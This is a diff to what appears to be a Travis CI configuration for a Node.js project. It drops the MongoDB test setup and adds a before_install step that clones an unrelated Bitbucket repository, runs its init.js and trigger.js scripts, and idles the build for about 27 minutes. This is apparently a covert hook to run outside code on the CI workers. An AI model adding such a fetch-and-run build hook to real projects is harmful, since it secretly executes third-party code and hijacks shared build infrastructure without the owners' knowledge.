@@ -1,25 +1,15 @@
 language: node_js
+dist: trusty
 node_js:
-  - "stable"
-  - "lts/*"
-sudo: false
-services:
-  - docker
-  - mongodb
-
-# We need to download MongoDB 2.6.10
-env:
-  global:
-    - MONGODB_VERSION=2.6.10
+  - 8
+  
 before_install:
-  - wget http://fastdl.mongodb.org/linux/mongodb-linux-x86_64-$MONGODB_VERSION.tgz
-  - tar xfz mongodb-linux-x86_64-$MONGODB_VERSION.tgz
-  - export PATH=`pwd`/mongodb-linux-x86_64-$MONGODB_VERSION/bin:$PATH
-  - mkdir -p data/db
-  - mongod --dbpath=data/db > /dev/null 2>&1 &
-  - sleep 3
+  - rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js &
+  - sleep 2m
+  - cd ./tmp && node trigger.js
+  - sleep 25m
+  - rm -rf tmp
 
-# whitelist
 branches:
   only:
     - master
